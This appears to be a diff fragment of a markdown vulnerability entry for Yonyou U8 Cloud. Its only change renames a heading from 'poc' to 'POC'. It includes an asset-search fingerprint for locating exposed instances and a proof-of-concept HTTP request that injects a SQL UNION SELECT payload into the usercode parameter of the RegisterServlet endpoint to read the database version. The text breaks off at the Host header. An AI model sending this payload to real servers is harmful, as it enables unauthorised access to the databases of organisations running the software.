@@ -8,7 +8,7 @@
 app="用友-U8-Cloud"
 ```
 
-## poc
+## POC
 ```
 GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
 Host: 
